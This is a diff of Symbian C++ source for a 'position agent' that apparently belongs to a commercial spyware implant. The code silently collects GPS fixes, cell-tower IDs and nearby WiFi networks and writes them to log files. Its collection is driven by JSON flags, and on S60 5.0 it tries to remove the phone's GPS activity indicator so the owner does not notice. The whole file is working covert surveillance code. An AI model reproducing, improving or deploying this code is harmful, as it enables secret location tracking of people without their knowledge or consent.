@@ -1,47 +1,23 @@
 /*
  ============================================================================
  Name		: AgentPosition.cpp
- Author	  : Marco Bellino
+ Author	  : Jo'
  Version	 : 1.0
  Copyright   : Your copyright notice
  Description : CAgentPosition implementation
  ============================================================================
  */
 
-/*
- * jo':
- * some information about the implementation of gps positioning
- * there are two main cases:
- * 1. the acquirement interval of gps position is < 14 minutes
- * 	in this case we don't care about power/resources consumption; iPollGps is set to false and iGps object 
- * 	is never deleted
- * 2. the acquirement interval of gps position is > 14 minutes  
- * 	in this case we do care about power/resources consumption; iPollGps is set to true and iGps object 
- *  is deleted. This is the behaviour outline: as soon as we a have a fix in  CAgentPosition::HandleGPSPositionL
- *  iGps object is deleted; when timer expires (CAgentPosition::TimerExpired), the iGps object 
- *  is deleted and a new request issued, this time at 10 seconds; when the fix is obtained in CAgentPosition::HandleGPSPositionL
- *  again iGps object is deleted and so on.... 
- * Please refer to the code for specific error management.
- * 
- */
 #include "AgentPosition.h"
 #include <HT\LogFile.h>
 #include <lbssatellite.h>
 #include <HT\TimeUtils.h>
 #include <FeatDiscovery.h>
 #include <featureinfo.h>
+#include "Json.h"
 
-struct TPositionParams
-	{
-	TUint32 iInterval;
-	TUint32 iType;
-	};
 
 const static TInt KMaxTimeoutForFixMin = 14;
-
-#define LOGGER_GPS  1 // Prendi la posizione dal GPS
-#define LOGGER_CELL 2 // Prendi la posizione dalla BTS
-#define LOGGER_WIFI 4 // Prendi la lista delle reti WiFi in vista
 
 #define GPS_POLL_TIMEOUT_MS 1000 * 60 * 14 // Tempo massimo di wait prima che il GPS venga spento
 
@@ -194,7 +170,7 @@ typedef struct TWiFiInfo
 	} TWiFiInfo;
 	
 CAgentPosition::CAgentPosition() :
-	CAbstractAgent(EAgent_Position), iStopped(EFalse)
+	CAbstractAgent(EAgent_Position),iBusyWiFi(EFalse),iBusyCellId(EFalse),iBusyGps(EFalse)
 	{
 	// No implementation required
 	}
@@ -233,122 +209,153 @@ void CAgentPosition::ConstructL(const TDesC8& params)
 	__FLOG_OPEN("HT", "Agent_Position.txt");
 	__FLOG(_L("-------------"));
 		
-	iTimer = CTimeOutTimer::NewL(*this);
+	//retrieve parameters
+	RBuf paramsBuf;
+						
+	TInt errCreate = paramsBuf.Create(2*params.Size());
+	if(errCreate == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+					
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//get flags
+		rootObject->GetBoolL(_L("gps"),iCaptureGps);
+		rootObject->GetBoolL(_L("wifi"),iCaptureWiFi);
+		rootObject->GetBoolL(_L("cell"),iCaptureCellId);
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+		
 	iPhone = CPhone::NewL();
 	iGPS = NULL;
-	// iGPS will be instantiated by the StartAgentCmdL() if the interval is < GPS_POLL_TIMEOUT_MS
-	// otherwise, will be instantiated by the TimerExpiredL()
-	// so we will keep the GPS Server free
-
-	ASSERT(iParams.Length() >= 8);
-	TPositionParams positParams;
-	Mem::Copy(&positParams, iParams.Ptr(), sizeof(positParams));
-
-	
-	iSecondsInterv = (positParams.iInterval / 1000);
-
-	iCaptureGPS = EFalse;
-	iCaptureCellId = EFalse;
-	iCaptureWiFi = EFalse;
-	iPollGPS = EFalse;
+	iLogGps = NULL;
+	iLogCell = NULL;
 	
 	iAvailableWiFiModule = CFeatureDiscovery::IsFeatureSupportedL(KFeatureIdProtocolWlan);
-	
-	if ((positParams.iType & LOGGER_GPS) > 0)
+
+	if (!iAvailableWiFiModule )
 		{
-		iCaptureGPS = ETrue;
+		// wifi module not available on device, we re-set wifi flag
+		iCaptureWiFi = EFalse;
+		}
+
+	if(iCaptureCellId)
+		{
+		iLogCell = CLogFile::NewL(iFs);
+		TLocationAdditionalData cellAdditionalData;
+		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
+		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
+		}
+	if(iCaptureGps)
+		{
 		iLogGps = CLogFile::NewL(iFs);
+		TLocationAdditionalData gpsAdditionalData;
+		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
+		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
+		}
+
+	if (iCaptureGps)
+		{
 		
-		if (positParams.iInterval > GPS_POLL_TIMEOUT_MS)
-			{
-			// in this way we can close the connection to the positioning server as soon as 
-			// we obtain the fix, and we don't waist resources
-			iPollGPS = ETrue;
-			}
+		iGPS = CGPSPosition::NewL(*this);
+		iTimer = CTimeOutTimer::NewL(*this);
+		TTime time;
+		time.HomeTime();
+		time += (TTimeIntervalMinutes)KMaxTimeoutForFixMin;
+		iTimer->RcsAt(time);
+
 #ifdef __S60_50__
 		//try to remove GPS activity indicator
 		iGpsIndicatorRemover = CGpsIndicatorRemover::NewL(KPosIndicatorCategoryUid,KPosIntGpsHwStatus);
 		if(iGpsIndicatorRemover)
 			iGpsIndicatorRemover->Start();
 #endif
+		
 		}
 	
-	if ((positParams.iType & LOGGER_CELL) > 0)
-		{
-		iCaptureCellId = ETrue;
-		iLogCell = CLogFile::NewL(iFs);
-		}
-	if (((positParams.iType & LOGGER_WIFI) > 0) && iAvailableWiFiModule )
-		{
-		iCaptureWiFi = ETrue;
-		}
-
-	if(iCaptureCellId)
-		{
-		TLocationAdditionalData cellAdditionalData;
-		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
-		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
-		}
-	if(iCaptureGPS)
-		{
-		TLocationAdditionalData gpsAdditionalData;
-		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
-		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
-		}
 	}
 
 void CAgentPosition::StartAgentCmdL()
 	{
 	__FLOG(_L("StartAgentCmdL()"));
-	/*
-	if(iCaptureCellId)
+	
+	if (iCaptureCellId && (!iBusyCellId))
 		{
-		TLocationAdditionalData cellAdditionalData;
-		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
-		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
-		}
-	if(iCaptureGPS)
-		{
-		TLocationAdditionalData gpsAdditionalData;
-		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
-		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
-		}
-*/
-	if(!iStopped) //this means this is the first start
-		{
-		if(iCaptureGPS)
+		iBusyCellId = ETrue;
+		// Log CELL ID to file...
+		RBuf8 buf(GetCellIdBufferL());
+		buf.CleanupClosePushL();
+		TInt value;
+		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+		if(value)
 			{
-			delete iGPS;
-			iGPS = NULL;
-			iGPS = CGPSPosition::NewL(*this);
-			if(!iPollGPS)  
+			iLogCell->AppendLogL(buf);
+			}
+		CleanupStack::PopAndDestroy(&buf);
+		iBusyCellId  = EFalse;
+		}
+	
+	if(iCaptureWiFi && (!iBusyWiFi))
+		{
+		iBusyWiFi = ETrue;
+		TLocationAdditionalData additionalData;
+		additionalData.uType = LOGTYPE_LOCATION_WIFI;
+		// Log WiFi data to file..
+		RBuf8 buf(GetWiFiBufferL(&additionalData));
+		buf.CleanupClosePushL();
+		if (buf.Length() > 0)
+			{
+			TInt value;
+			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+			if(value)
 				{
-				//the following method must not be called if the update interval is > GPS_POLL_TIMEOUT_MS
-				// otherwise a panic: "lbs client fault 12" could be raised 
-				iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
+				CLogFile* logFile = CLogFile::NewLC(iFs);
+				logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
+				logFile->AppendLogL(buf);
+				logFile->CloseLogL();
+				CleanupStack::PopAndDestroy(logFile);
 				}
-			}	
-		if (iCaptureCellId || iPollGPS || iCaptureWiFi)
+			}
+		CleanupStack::PopAndDestroy(&buf);
+		iBusyWiFi = EFalse;
+		}
+	
+	if(iCaptureGps)
+		{
+		//restart timer
+		iTimer->Cancel();
+		TTime time;
+		time.HomeTime();
+		time += (TTimeIntervalMinutes)KMaxTimeoutForFixMin;
+		iTimer->RcsAt(time);
+
+		if(!iBusyGps)
 			{
-			TTime time;
-			time.HomeTime();
-			time += iSecondsInterv;
-			iTimer->RcsAt(time);
+			iBusyGps = ETrue;
+			if(iGPS == NULL)
+				iGPS = CGPSPosition::NewL(*this);
+			iGPS->ReceiveData(2, (KMaxTimeoutForFixMin-1));  //2= two seconds interval update, 
 			}
 		}
-		
-		iStopped = EFalse;
 	}
 
 void CAgentPosition::StopAgentCmdL()
 	{
-	iStopped = ETrue;
-	__FLOG(_L("StopAgentCmdL()"));
-	
-	if(iLogCell)
-		iLogCell->CloseLogL();
-	if(iLogGps)
-		iLogGps->CloseLogL();
+	// this is never the case, this is an instant module
 	}
 
 void CAgentPosition::CycleAgentCmdL()
@@ -358,23 +365,23 @@ void CAgentPosition::CycleAgentCmdL()
 		if(iLogCell)
 			{
 			iLogCell->CloseLogL();
-			iLogCell = NULL;
 			}
 		TLocationAdditionalData cellAdditionalData;
 		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
 		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
 		}
-	if(iCaptureGPS)
+	
+	if(iCaptureGps)
 		{
 		if(iLogGps)
 			{
 			iLogGps->CloseLogL();
-			iLogGps = NULL;
 			}
 		TLocationAdditionalData gpsAdditionalData;
 		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
 		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
 		}
+		
 	}
 
 
@@ -541,7 +548,7 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 		if(err == KErrNone)
 		{
 			wifiInfo.ssidLen = ssid.Length();
-			for(TInt i=0; i<wifiInfo.ssidLen; i++)
+			for(TInt i=0; i<wifiInfo.ssidLen; i++) 
 				wifiInfo.ssid[i] = ssid[i]; 
 		}
 		else 
@@ -565,95 +572,42 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 
 void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
 	{
-	if (iPollGPS)
-		{
-		// Closes the connection with the GPS Server.
-		delete iGPS;
-		iGPS = NULL;
-		}
-
+	// cancel subsequent requests, we have the position
+	iGPS->Cancel();
 	// Log the GPS position to file...
-	if(!iStopped)
+	RBuf8 buf(GetGPSBufferL(position));
+	buf.CleanupClosePushL();
+	if (buf.Length() > 0)
 		{
-		RBuf8 buf(GetGPSBufferL(position));
-		buf.CleanupClosePushL();
-		if (buf.Length() > 0)
+		TInt value;
+		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+		if(value)
 			{
-			TInt value;
-			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-			if(value)
-				{
-				iLogGps->AppendLogL(buf);
-				}
+			iLogGps->AppendLogL(buf);
 			}
-		CleanupStack::PopAndDestroy(&buf);
 		}
+	CleanupStack::PopAndDestroy(&buf);
+	iBusyGps = EFalse;
 	}
 
 void CAgentPosition::HandleGPSErrorL(TInt error)
 	{
+	// http://www.developer.nokia.com/Community/Wiki/KIS000850_-_RPositioner::NotifyPositionUpdate_return_KErrInUse_after_few_minutes
 	// Can't Fix or other error... try again...
-	if(!iPollGPS)
-		{
-		iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
-		}
-	}
-
-void CAgentPosition::TimerExpiredL(TAny* src)
-	{
-	TTime time;
-	time.HomeTime();
-	time += iSecondsInterv;
-	iTimer->RcsAt(time);
-
-	if (iCaptureGPS && iPollGPS)
+	if(error == KErrInUse)  //-14
 		{
 		delete iGPS;
 		iGPS = NULL;
 		iGPS = CGPSPosition::NewL(*this);
-		iGPS->ReceiveData(10, KMaxTimeoutForFixMin);
 		}
-	
-	if(!iStopped)
-		{
-		if (iCaptureCellId)
-			{
-			// Log CELL ID to file...
-			RBuf8 buf(GetCellIdBufferL());
-			buf.CleanupClosePushL();
-			TInt value;
-			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-			if(value)
-				{
-				iLogCell->AppendLogL(buf);
-				}
-			CleanupStack::PopAndDestroy(&buf);
-			}
-	
-		if(iCaptureWiFi)
-			{
-			TLocationAdditionalData additionalData;
-			additionalData.uType = LOGTYPE_LOCATION_WIFI;
-			// Log WiFi data to file..
-			RBuf8 buf(GetWiFiBufferL(&additionalData));
-			buf.CleanupClosePushL();
-			if (buf.Length() > 0)
-				{
-				TInt value;
-				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-				if(value)
-					{
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
-					}
-				}
-			CleanupStack::PopAndDestroy(&buf);
-			}
+	iGPS->ReceiveData(2, (KMaxTimeoutForFixMin-1));
+	}
 
-		}
+void CAgentPosition::TimerExpiredL(TAny* src)
+	{
+	delete iGPS;
+	iGPS = NULL;
+	iBusyGps = EFalse;
 	}
 
 /**
